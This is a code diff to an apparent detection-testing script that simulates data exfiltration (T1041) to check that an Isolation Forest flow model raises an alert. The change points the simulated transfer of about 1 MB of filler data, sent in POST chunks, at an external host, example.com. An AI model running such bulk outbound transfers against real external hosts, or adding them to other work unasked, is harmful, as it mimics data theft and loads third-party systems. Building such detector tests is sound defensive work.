@@ -1,12 +1,13 @@
 """Data exfiltration attack — large outbound transfer simulating data theft.
 
 Detection: flow_model anomaly (T1041, ML-based).
-Mechanism: Sends large POST requests to demo-api, simulating data being
-exfiltrated.  The flow model's feature window will see unusually high
-bytes_sent compared to normal traffic patterns.  The 6-feature vector
-(total_bytes_sent, total_bytes_received, connection_count,
-unique_dst_ports, unique_dst_ips, window_seconds) will show a byte
-volume spike that the Isolation Forest flags as anomalous.
+Mechanism: Sends large POST requests to an external host, simulating data
+being exfiltrated.  The external destination ensures events have
+direction=="external" so the flow model's feature extractor includes them.
+The model sees unusually high bytes_sent compared to normal traffic
+patterns.  The 6-feature vector (total_bytes_sent, total_bytes_received,
+connection_count, unique_dst_ports, unique_dst_ips, window_seconds) will
+show a byte volume spike that the Isolation Forest flags as anomalous.
 
 Expected result: An ML-flagged alert with flow_model anomaly score
 exceeding the 0.52 threshold, tagged T1041 ("Exfiltration Over Web
@@ -23,19 +24,22 @@ sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 
 import time
 
-from scripts import banner, get_target_host, http_post, log
+from scripts import banner, http_post, log
 
 # Simulate exfiltrating data in chunks — each POST sends ~50KB of
 # payload (realistic for credential dumps, database exports, etc.)
 CHUNK_SIZE = 50_000       # bytes per POST body
 CHUNK_COUNT = 20          # total chunks (= ~1MB exfiltrated)
 DELAY_BETWEEN = 0.5       # seconds between chunks
+# External target so events get direction=="external" for flow_model
+TARGET_HOST = "example.com"
+TARGET_PORT = 80
+TARGET_PATH = "/"
 
 
 def main() -> None:
     banner("DATA EXFILTRATION — flow_model / T1041")
-    target = get_target_host("demo-api")
-    log(f"Target: {target}:5000/api/orders (POST)")
+    log(f"Target: {TARGET_HOST}:{TARGET_PORT}{TARGET_PATH} (POST)")
     log(f"Payload: {CHUNK_SIZE} bytes × {CHUNK_COUNT} chunks = "
         f"{CHUNK_SIZE * CHUNK_COUNT / 1024:.0f} KB total")
     log("")
@@ -53,7 +57,7 @@ def main() -> None:
         }).encode()
 
         code, body = http_post(
-            target, 5000, "/api/orders",
+            TARGET_HOST, TARGET_PORT, TARGET_PATH,
             payload, content_type="application/json", timeout=5.0,
         )
         status = "OK" if code in (200, 201) else f"HTTP {code}"
